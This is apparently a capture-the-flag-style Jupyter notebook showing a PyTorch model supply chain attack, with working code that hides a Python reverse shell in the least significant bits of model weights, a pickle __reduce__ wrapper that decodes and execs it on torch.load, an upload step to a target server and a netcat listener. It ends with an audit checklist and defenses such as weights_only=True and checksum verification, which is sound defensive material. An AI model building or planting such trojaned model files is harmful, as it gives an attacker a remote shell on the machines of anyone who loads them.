# Model Steganography & Pickle Deserialization Attack

**Author:** Teodora Demerdzhieva  
**Topic:** Adversarial Machine Learning — Model Supply Chain Attack  
**Difficulty:** Advanced

---

## What This Notebook Covers

This notebook demonstrates a **model supply chain attack** that combines two techniques:

1. **LSB Steganography** — hiding a malicious payload inside the weights of a neural network, invisible to anyone inspecting the model
2. **Pickle Deserialization Exploit** — triggering that payload automatically when someone loads the model with `torch.load()`

The end result: a `.pth` file that looks like a legitimate PyTorch model, passes basic inspection, but executes a **reverse shell** on the victim's machine the moment they load it.

---

## Prerequisites for the Attack to Succeed

For this attack to work, the following conditions must be met on the victim's side:

| Condition | Why it matters |
|-----------|----------------|
| Model loaded with `torch.load(..., weights_only=False)` | The default in older PyTorch versions. Allows arbitrary Python objects to be deserialized — this is what triggers the payload |
| Model weights stored as **float32** | The steganography uses the least significant bits of 32-bit floats. float16 or float64 tensors won't work |
| No checksum verification on the model file | If the file hash is checked against a known good value, the tampered model will be rejected |
| Model loaded from an untrusted or external source | Internal models with signed versions are much harder to tamper with |
| Python and PyTorch available on the target machine | The payload is Python code — it needs a Python runtime to execute |

> **Note:** PyTorch >= 2.0 defaults to `weights_only=True`, which blocks this attack. The attack relies on older codebases or developers who explicitly set `weights_only=False`.

---

## A Note on Real-World Use

In my opinion, for this specific vulnerability, **an audit is more valuable than an active attack** in most real-world engagements.

What an audit for this vulnerability actually checks:
- Whether `weights_only=False` appears anywhere in the codebase
- Whether checksum verification exists when downloading or loading models
- Whether models come from trusted, signed sources with version pinning
- Whether the model loading code is isolated from sensitive systems

Running this attack in production is noisy and risky. Finding the misconfiguration and documenting it is often enough to demonstrate the impact — and far safer for everyone involved.

---

## How It Works — The Big Picture

### Step 1 — LSB Steganography

Every weight in a neural network is a 32-bit float. The last 1-2 bits of each float have almost no effect on model predictions — changing them shifts the value by a tiny fraction.

We take those last bits and use them to store our payload, one bit at a time:

```
Original weight:  0.48291734  →  binary: 00111110111101110000101000111101
After embedding:  0.48291738  →  binary: 00111110111101110000101000111110
                                                                       ↑↑
                                                         2 bits changed — payload data stored here
```

The model still works. The numbers barely changed. Nothing looks wrong.

### Step 2 — Pickle Deserialization

`torch.save()` uses Python's `pickle` format internally. Pickle allows objects to define what happens when they are loaded via a special `__reduce__` method.

We wrap our model in a malicious class whose `__reduce__` method tells Python:

> *"When you load this, it first decodes and executes the payload hidden in the weights."*

When the victim runs `torch.load("model.pth")`, Python's pickle automatically calls `__reduce__` — and the reverse shell executes.

## 1. Setup

We use `struct` to convert between floats and their raw binary representations — this is the core of how LSB steganography works on floating point numbers.

In [1]:
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import TensorDataset, DataLoader
import numpy as np
import struct   # used to read/write raw bytes of float32 values
import pickle   # used to serialize Python objects (exploited later)
import os
import socket
import subprocess
import pty
import sys
import traceback

# Fix random seeds so results are reproducible
SEED = 1337
np.random.seed(SEED)
torch.manual_seed(SEED)

print("Imports complete.")

Imports complete.


## 2. The Target Model

This is the model we will use as a carrier for the hidden payload.

Notice `large_layer` - a `Linear(64, 320)` layer that is **defined but not used** in the forward pass. It exists purely to give us storage space for the payload. In a real attack, you would use an existing large layer from the victim's actual model.


In [2]:
class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super(SimpleNet, self).__init__()

        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)

        # This layer is intentionally not used in forward().
        # Its weights serve as storage space for the hidden payload.
        # In a real engagement, a large existing layer in the victim's model
        # would be used instead — no need to add a suspicious extra layer.
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)

    def forward(self, x):
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x


input_dim  = 10
hidden_dim = 64
output_dim = 1

target_model = SimpleNet(input_dim, hidden_dim, output_dim)

print("Model structure:")
print(target_model)
print("\nLayer shapes and element counts:")
for name, param in target_model.state_dict().items():
    print(f"  {name}: shape={param.shape}, elements={param.numel()}, dtype={param.dtype}")

Model structure:
SimpleNet(
  (fc1): Linear(in_features=10, out_features=64, bias=True)
  (relu): ReLU()
  (fc2): Linear(in_features=64, out_features=1, bias=True)
  (large_layer): Linear(in_features=64, out_features=320, bias=True)
)

Layer shapes and element counts:
  fc1.weight: shape=torch.Size([64, 10]), elements=640, dtype=torch.float32
  fc1.bias: shape=torch.Size([64]), elements=64, dtype=torch.float32
  fc2.weight: shape=torch.Size([1, 64]), elements=64, dtype=torch.float32
  fc2.bias: shape=torch.Size([1]), elements=1, dtype=torch.float32
  large_layer.weight: shape=torch.Size([320, 64]), elements=20480, dtype=torch.float32
  large_layer.bias: shape=torch.Size([320]), elements=320, dtype=torch.float32


## 3. Train the Model

We do a minimal training run so the model has realistic-looking weights. Freshly initialized weights are uniform and random - trained weights have a more natural distribution that looks less suspicious.

In a real attack, you would tamper with the victim's already-trained model rather than training from scratch.

In [3]:
# Generate synthetic training data
num_samples  = 100
X_train      = torch.randn(num_samples, input_dim)
true_weights = torch.randn(input_dim, output_dim)
y_train      = X_train @ true_weights + torch.randn(num_samples, output_dim) * 0.5

dataset    = TensorDataset(X_train, y_train)
dataloader = DataLoader(dataset, batch_size=16)

criterion = nn.MSELoss()
optimizer = optim.Adam(target_model.parameters(), lr=0.01)

print("Training model...")
target_model.train()

for epoch in range(5):
    epoch_loss = 0.0
    for inputs, targets in dataloader:
        optimizer.zero_grad()
        outputs = target_model(inputs)
        loss    = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        epoch_loss += loss.item()
    print(f"  Epoch {epoch+1}/5 — loss: {epoch_loss/len(dataloader):.4f}")

print("Training complete.")

Training model...
  Epoch 1/5 — loss: 12.1945
  Epoch 2/5 — loss: 8.1869
  Epoch 3/5 — loss: 4.2915
  Epoch 4/5 — loss: 1.3085
  Epoch 5/5 — loss: 0.5632
Training complete.


## 4. Save a Clean Baseline

We save the clean model first so we can compare file sizes and weight values before and after the payload is embedded.

In [4]:
clean_model_path = "target_model_clean.pth"
torch.save(target_model.state_dict(), clean_model_path)

print(f"Clean model saved to '{clean_model_path}'.")
print(f"File size: {os.path.getsize(clean_model_path)} bytes")

Clean model saved to 'target_model_clean.pth'.
File size: 89433 bytes


## 5. LSB Steganography - Hiding the Payload

This is the core of the attack. We hide data inside floating point weights by modifying their least significant bits.

### Why LSBs?

A 32-bit float looks like this in binary:

```
[ sign | 8 bits exponent | 23 bits mantissa ]
```

The last 1-2 bits of the mantissa have almost zero effect on the actual value. We overwrite those bits with our payload data without meaningfully changing what the model predicts.

### Capacity calculation

With `num_lsb = 2` and a layer of 20,480 elements:
```
20,480 elements × 2 bits = 40,960 bits = 5,120 bytes of storage
```

More than enough for a reverse shell payload (~1-2 KB).


In [13]:
def encode_lsb(tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int) -> torch.Tensor:
    """
    Hides data_bytes inside the least significant bits of a float32 tensor.

    The length of the data is stored first as a 4-byte prefix so the decoder
    knows how many bytes to extract.

    Parameters
    ----------
    tensor_orig : float32 tensor to use as the carrier
    data_bytes  : bytes to hide
    num_lsb     : how many bits per float to use (1 = minimal distortion, 8 = max capacity)
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Carrier tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be between 1 and 8.")

    tensor      = tensor_orig.clone().detach()
    tensor_flat = tensor.flatten()
    n_elements  = tensor_flat.numel()

    # Prepend 4-byte length header so the decoder knows when to stop reading
    data_to_embed    = struct.pack(">I", len(data_bytes)) + data_bytes
    total_bits       = len(data_to_embed) * 8
    capacity_bits    = n_elements * num_lsb

    if total_bits > capacity_bits:
        needed = (total_bits + num_lsb - 1) // num_lsb
        raise ValueError(
            f"Tensor too small: need {needed} elements, have {n_elements}. "
            f"Try a larger layer or increase num_lsb."
        )

    data_iter         = iter(data_to_embed)
    current_byte      = next(data_iter, None)
    bit_index         = 7       # start from the most significant bit of each byte
    element_index     = 0
    bits_embedded     = 0

    while bits_embedded < total_bits and element_index < n_elements:
        if current_byte is None:
            break

        # Read the float as raw 32-bit integer so we can manipulate individual bits
        original_float    = tensor_flat[element_index].item()
        int_repr          = struct.unpack(">I", struct.pack(">f", original_float))[0]

        mask              = (1 << num_lsb) - 1   # e.g. num_lsb=2 → mask=0b11
        bits_for_element  = 0

        for i in range(num_lsb):
            if current_byte is None:
                break
            data_bit           = (current_byte >> bit_index) & 1
            bits_for_element  |= data_bit << (num_lsb - 1 - i)
            bit_index         -= 1
            if bit_index < 0:                    # current byte fully consumed
                current_byte = next(data_iter, None)
                bit_index    = 7
            bits_embedded += 1
            if bits_embedded >= total_bits:
                break

        # Write the data bits into the LSBs of this float
        new_int   = (int_repr & ~mask) | bits_for_element
        new_float = struct.unpack(">f", struct.pack(">I", new_int))[0]
        tensor_flat[element_index] = new_float
        element_index += 1

    print(f"Embedded {bits_embedded} bits into {element_index} tensor elements using {num_lsb} LSB(s) per element.")
    return tensor

In [14]:
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    """
    Extracts data hidden by encode_lsb from a float32 tensor.

    Reads the 4-byte length header first, then extracts exactly that many bytes.

    Parameters
    ----------
    tensor_modified : tensor containing the hidden data
    num_lsb         : must match the value used during encoding
    """
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be between 1 and 8.")

    tensor_flat    = tensor_modified.flatten()
    n_elements     = tensor_flat.numel()
    element_index  = 0

    def read_bits(count: int) -> list:
        """Reads `count` bits from the LSBs of the tensor, advancing element_index."""
        nonlocal element_index
        bits = []
        while len(bits) < count:
            if element_index >= n_elements:
                raise ValueError(f"Ran out of tensor elements after {element_index} — need {count} bits, have {len(bits)}.")
            current_float = tensor_flat[element_index].item()
            int_repr      = struct.unpack(">I", struct.pack(">f", current_float))[0]
            mask          = (1 << num_lsb) - 1
            lsb_data      = int_repr & mask
            for i in range(num_lsb):
                bits.append((lsb_data >> (num_lsb - 1 - i)) & 1)
                if len(bits) == count:
                    break
            element_index += 1
        return bits

    # Read the 4-byte (32-bit) length prefix first
    length_bits    = read_bits(32)
    payload_length = 0
    for bit in length_bits:
        payload_length = (payload_length << 1) | bit

    if payload_length == 0:
        return b""

    # Now read the actual payload
    payload_bits   = read_bits(payload_length * 8)
    decoded_bytes  = bytearray()
    current_byte   = 0
    bit_count      = 0

    for bit in payload_bits:
        current_byte = (current_byte << 1) | bit
        bit_count   += 1
        if bit_count == 8:
            decoded_bytes.append(current_byte)
            current_byte = 0
            bit_count    = 0

    print(f"Decoded {len(decoded_bytes)} bytes using {element_index} tensor elements with {num_lsb} LSB(s).")
    return bytes(decoded_bytes)

## 6. Define the Reverse Shell Payload

This is the code that will execute on the victim's machine when they load the model.

It opens a TCP connection back to the attacker's machine and spawns an interactive shell over that connection.

Before running this notebook:
- Replace `HOST_IP` with your actual IP address on the target network
- Replace `LISTENER_PORT` with the port you will listen on
- Start a listener: `nc -lvnp 443`


In [7]:
HOST_IP       = "10.10.16.210"   # your IP on the HTB/engagement network
LISTENER_PORT = 443             # the port your netcat listener is on

print(f"Payload target: {HOST_IP}:{LISTENER_PORT}")
print("Make sure your listener is running: nc -lvnp 443")

Payload target: 10.10.16.210:443
Make sure your listener is running: nc -lvnp 443


In [8]:
# This string is the actual payload that will be hidden inside the model weights
# and executed on the victim machine when they load the .pth file
payload_code = f"""
import socket, subprocess, os, pty, sys, traceback

attacker_ip   = '{HOST_IP}'
attacker_port = {LISTENER_PORT}

s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port))
    s.settimeout(None)

    # Redirect stdin/stdout/stderr to the socket — all shell I/O goes over the network
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    shell = os.environ.get('SHELL', '/bin/bash')
    pty.spawn([shell])   # spawn an interactive shell

except Exception as e:
    pass
finally:
    if s:
        try: s.close()
        except: pass
    os._exit(1)
"""

payload_bytes = payload_code.encode("utf-8")
print(f"Payload size: {len(payload_bytes)} bytes")

Payload size: 653 bytes


## 7. Embed the Payload into the Model Weights

We load the clean model's weights, embed the payload into the `large_layer.weight` tensor, and verify the weights changed only slightly.


In [9]:
NUM_LSB = 2   # 2 bits per float — good balance of capacity vs distortion

# Load the clean model weights
state_dict = torch.load("target_model_clean.pth", weights_only=True)

# We embed into large_layer.weight — it has the most elements
TARGET_LAYER = "large_layer.weight"

original_tensor = state_dict[TARGET_LAYER]
print(f"Target layer: {TARGET_LAYER}")
print(f"Shape: {original_tensor.shape} — {original_tensor.numel()} elements")
print(f"Capacity with {NUM_LSB} LSBs: {original_tensor.numel() * NUM_LSB // 8} bytes")
print(f"Payload size: {len(payload_bytes)} bytes + 4 byte header = {len(payload_bytes)+4} bytes")
print()

# Embed the payload
modified_tensor = encode_lsb(original_tensor, payload_bytes, NUM_LSB)

# Show before/after comparison on first 5 weights
print("\nWeight comparison (first 5 values):")
print("  Original:", original_tensor.flatten()[:5].tolist())
print("  Modified:", modified_tensor.flatten()[:5].tolist())
print("  Diff:    ", (modified_tensor.flatten()[:5] - original_tensor.flatten()[:5]).tolist())

# Store the modified tensor back into the state dict
modified_state_dict = state_dict.copy()
modified_state_dict[TARGET_LAYER] = modified_tensor

print("\nPayload embedded successfully.")

Target layer: large_layer.weight
Shape: torch.Size([320, 64]) — 20480 elements
Capacity with 2 LSBs: 5120 bytes
Payload size: 653 bytes + 4 byte header = 657 bytes

Embedded 5256 bits into 2628 tensor elements using 2 LSB(s) per element.

Weight comparison (first 5 values):
  Original: [-0.006674066185951233, -0.10536490380764008, -0.006343632936477661, 0.0934080183506012, 0.029758349061012268]
  Modified: [-0.006674066185951233, -0.10536488890647888, -0.006343632936477661, 0.0934080183506012, 0.029758349061012268]
  Diff:     [0.0, 1.4901161193847656e-08, 0.0, 0.0, 0.0]

Payload embedded successfully.


## 8. The Pickle Exploit — TrojanModelWrapper

Now we need a way to trigger the payload automatically when the file is loaded.

Python's `pickle` format (used internally by `torch.save`) supports a special method called `__reduce__`. When pickle deserializes an object, it calls `__reduce__` to find out how to reconstruct it.

We abuse this: our `__reduce__` returns `(exec, (loader_code,))` — telling pickle to run `exec(loader_code)` during loading.

The loader code:
1. Deserializes the embedded state dict
2. Extracts the payload tensor
3. Decodes the hidden payload using `decode_lsb`
4. Executes the reverse shell with `exec()`

All of this happens inside `torch.load()` — the victim never sees it.

In [10]:
class TrojanModelWrapper:
    """
    A malicious wrapper that abuses Python pickle deserialization.

    When torch.load() deserializes this object, __reduce__ is called automatically.
    __reduce__ returns an (exec, code) tuple that runs the hidden payload.

    The payload is decoded at load time from the LSBs of the model weights —
    so the malicious code never appears directly in the file.
    """

    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        if target_key not in modified_state_dict:
            raise ValueError(f"Key '{target_key}' not found in state dict.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor '{target_key}' must be float32.")

        # Pickle the entire state dict and store it inside the wrapper
        # This gets embedded in the final .pth file
        self.pickled_state_dict = pickle.dumps(modified_state_dict)
        self.target_key         = target_key
        self.num_lsb            = num_lsb

        print(f"Wrapper initialized. Embedded state dict: {len(self.pickled_state_dict)} bytes.")

    def __reduce__(self):
        """
        Called automatically by pickle during serialization/deserialization.
        Returns (exec, (code_string,)) — which causes exec(code_string) to run
        when the file is loaded by the victim.
        """

        # The decode_lsb function needs to be available inside the loader code.
        # We embed it as source code so it is self-contained.
        decode_lsb_source = """
import torch, struct
def decode_lsb(tensor_modified, num_lsb):
    tensor_flat = tensor_modified.flatten()
    n_elements  = tensor_flat.numel()
    ei          = 0
    def read_bits(count):
        nonlocal ei; bits = []
        while len(bits) < count:
            if ei >= n_elements: raise ValueError("Tensor ended prematurely.")
            cf   = tensor_flat[ei].item()
            ir   = struct.unpack('>I', struct.pack('>f', cf))[0]
            mask = (1 << num_lsb) - 1; lsb = ir & mask
            for i in range(num_lsb):
                bits.append((lsb >> (num_lsb - 1 - i)) & 1)
                if len(bits) == count: break
            ei += 1
        return bits
    lb = read_bits(32); pl = 0
    for b in lb: pl = (pl << 1) | b
    if pl == 0: return b''
    pb   = read_bits(pl * 8); out = bytearray(); cv = 0; bc = 0
    for b in pb:
        cv = (cv << 1) | b; bc += 1
        if bc == 8: out.append(cv); cv = 0; bc = 0
    return bytes(out)
"""

        # Build the self-contained loader code that will run on the victim machine
        loader_code = f"""
import pickle, torch, struct, sys
{decode_lsb_source}
pickled_sd  = {repr(self.pickled_state_dict)}
target_key  = {repr(self.target_key)}
num_lsb     = {self.num_lsb}
try:
    sd              = pickle.loads(pickled_sd)
    payload_tensor  = sd[target_key]
    payload_bytes   = decode_lsb(payload_tensor, num_lsb)
    payload_code    = payload_bytes.decode('utf-8', errors='replace')
    exec(payload_code, globals(), locals())
except Exception as e:
    pass
"""
        return (exec, (loader_code,))


print("TrojanModelWrapper class defined.")

TrojanModelWrapper class defined.


## 9. Create and Save the Malicious File

We wrap the modified state dict in the `TrojanModelWrapper` and save it with `torch.save()`.

The resulting file:
- Has the same extension (`.pth`) as a legitimate model
- Contains all the original model weights
- Has a file size close to the original
- Will execute our payload when loaded with `torch.load(..., weights_only=False)`


In [11]:
# Wrap the poisoned state dict
wrapper = TrojanModelWrapper(
    modified_state_dict=modified_state_dict,
    target_key=TARGET_LAYER,
    num_lsb=NUM_LSB,
)

# Save the malicious file
malicious_path = "malicious_trojan_model.pth"
torch.save(wrapper, malicious_path)

clean_size     = os.path.getsize("target_model_clean.pth")
malicious_size = os.path.getsize(malicious_path)

print(f"Clean model size    : {clean_size:,} bytes")
print(f"Malicious file size : {malicious_size:,} bytes")
print(f"Difference          : {malicious_size - clean_size:,} bytes")
print()
print(f"Malicious file saved to '{malicious_path}'.")
print("Ready to upload. Make sure your listener is running.")

Wrapper initialized. Embedded state dict: 88221 bytes.
Clean model size    : 89,433 bytes
Malicious file size : 254,919 bytes
Difference          : 165,486 bytes

Malicious file saved to 'malicious_trojan_model.pth'.
Ready to upload. Make sure your listener is running.


![Model size comparison](images/sizeComparison.png)

## 10. Upload to Target

We upload the malicious `.pth` file to the target server. The server will load the model using `torch.load()` - which triggers the payload.

Before running this cell:
1. Start your listener: `nc -lvnp 443`
2. Replace the `api_url` with the correct target URL


In [12]:
import requests

api_url = "http://$url"  # replace with target URL

if not os.path.exists(malicious_path):
    print(f"Error: '{malicious_path}' not found. Run the previous cell first.")
else:
    print(f"Uploading '{malicious_path}' to '{api_url}'...")

    with open(malicious_path, "rb") as f:
        files = {"model": (os.path.basename(malicious_path), f, "application/octet-stream")}

        try:
            response = requests.post(api_url, files=files, timeout=30)
            print(f"\nStatus code: {response.status_code}")

            try:
                print("Response:", response.json())
            except:
                print("Response:", response.text)

            if response.status_code == 200:
                print("\nUpload successful. Check your listener for a connection.")
            else:
                print("\nUpload may have failed. Check the response above.")

        except requests.exceptions.ConnectionError:
            print("Connection error — is the target running and reachable?")
        except Exception as e:
            print(f"Unexpected error: {e}")
            traceback.print_exc()

Uploading 'malicious_trojan_model.pth' to 'http://10.129.234.139:5555/upload'...
Unexpected error: HTTPConnectionPool(host='10.129.234.139', port=5555): Read timed out. (read timeout=30)


Traceback (most recent call last):
  File "/home/kali/miniconda3/envs/dataenv/lib/python3.11/site-packages/urllib3/connectionpool.py", line 534, in _make_request
    response = conn.getresponse()
               ^^^^^^^^^^^^^^^^^^
  File "/home/kali/miniconda3/envs/dataenv/lib/python3.11/site-packages/urllib3/connection.py", line 571, in getresponse
    httplib_response = super().getresponse()
                       ^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/miniconda3/envs/dataenv/lib/python3.11/http/client.py", line 1415, in getresponse
    response.begin()
  File "/home/kali/miniconda3/envs/dataenv/lib/python3.11/http/client.py", line 330, in begin
    version, status, reason = self._read_status()
                              ^^^^^^^^^^^^^^^^^^^
  File "/home/kali/miniconda3/envs/dataenv/lib/python3.11/http/client.py", line 291, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/miniconda3/envs/

![Reverse shell](images/shell.png)

## 11. Key Takeaways

| Aspect | Detail |
|--------|--------|
| **Attack type** | Model supply chain - steganography + pickle deserialization |
| **Steganography method** | LSB (Least Significant Bit) encoding in float32 weights |
| **Exploit mechanism** | Python pickle `__reduce__` method abuse |
| **Trigger** | `torch.load(..., weights_only=False)` |
| **Payload** | Reverse shell via TCP socket |
| **Detection difficulty** | High - file looks like a normal model, weights change by tiny fractions |

---

### Audit Checklist for This Vulnerability

In a real engagement, I would recommend an **audit over an active attack** for this specific vulnerability. The misconfiguration is easy to find and document, and demonstrating it through code review is far less risky than executing a reverse shell in a production environment.

What to look for in a code audit:

```python
# RED FLAG — allows arbitrary code execution on load
torch.load("model.pth")                        # weights_only defaults to False in older PyTorch
torch.load("model.pth", weights_only=False)    # explicitly unsafe

# SAFE
torch.load("model.pth", weights_only=True)     # only loads tensors, no arbitrary Python objects
```

Full audit checklist:
- [ ] Is `weights_only=False` used anywhere in the codebase?
- [ ] Are model files verified with checksums (SHA256) before loading?
- [ ] Do models come from trusted, signed sources with pinned versions?
- [ ] Is the model loading code isolated from sensitive infrastructure?
- [ ] Are third-party pre-trained models treated as untrusted input?

---

### Defenses

- **Use `weights_only=True`** - the single most effective fix; blocks pickle deserialization entirely
- **Verify checksums** - compare SHA256 of the model file against a known good value before loading
- **Use signed model repositories** - treat model files like software dependencies (pinned versions, signed releases)
- **Sandbox model loading** - load models in an isolated environment without network access
- **Static analysis** — scan `.pth` files for suspicious pickle opcodes before loading

---

### References

- [MITRE ATLAS — ML Supply Chain Compromise](https://atlas.mitre.org/techniques/AML.T0010)
- [PyTorch Security — weights_only documentation](https://pytorch.org/docs/stable/generated/torch.load.html)
- [OWASP Machine Learning Security Top 10](https://owasp.org/www-project-machine-learning-security-top-10/)